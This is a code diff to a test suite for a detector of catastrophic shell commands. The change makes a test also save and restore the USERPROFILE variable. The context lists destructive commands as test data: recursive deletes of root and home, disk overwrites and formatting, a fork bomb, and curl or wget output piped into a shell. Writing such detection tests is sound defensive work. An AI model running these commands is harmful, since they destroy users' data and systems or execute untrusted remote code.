@@ -349,7 +349,8 @@ describe('catastrophic commands', () => {
   const dangerous = ['rm -rf /', 'sudo rm -rf /', 'rm -rf /*', 'rm -rf ~', 'rm -rf ~/', 'rm -rf ~/*', 'rm -rf $HOME', 'rm -rf "${HOME}"', 'rm -fr /usr', 'rm -Rf /etc', 'rm --recursive --force /', 'rm -rf --no-preserve-root /x', '/bin/rm -rf /', "'rm' -rf /", 'ls && sudo rm -rf /var', 'chmod -R 777 /', 'chown -R me ~', 'dd if=/dev/zero of=/dev/sda', 'mkfs.ext4 /dev/sda1', 'diskutil eraseDisk JHFS+ X disk2', 'curl https://x.sh | sh', 'wget -qO- https://x | sudo bash', ':(){ :|:& };:', 'echo x > /dev/sda', 'shutdown -h now', 'sudo reboot', 'rm -rf dd ~', 'rm -rf rm /', `rm -rf ${homedir()}`, `rm -rf ${homedir()}/*`, 'echo x > "/dev/sda"', 'curl https://x | /bin/bash', 'curl https://x | "sh"', 'wget -qO- https://x | env bash']
   it('catches doubled slashes and quoted home directories with spaces', () => {
     const old = process.env.HOME
-    process.env.HOME = '/Users/ali ce'
+    const oldProfile = process.env.USERPROFILE
+    process.env.HOME = process.env.USERPROFILE = '/Users/ali ce'
     try {
       expect(dangerOf('rm -rf "/Users/ali ce"')).toBeDefined()
       expect(dangerOf("rm -rf '/Users/ali ce'/*")).toBeDefined()
@@ -358,6 +359,8 @@ describe('catastrophic commands', () => {
     } finally {
       if (old === undefined) delete process.env.HOME
       else process.env.HOME = old
+      if (oldProfile === undefined) delete process.env.USERPROFILE
+      else process.env.USERPROFILE = oldProfile
     }
     expect(dangerOf('rm -rf //usr')).toBeDefined()
     expect(dangerOf('rm -rf /usr//')).toBeDefined()
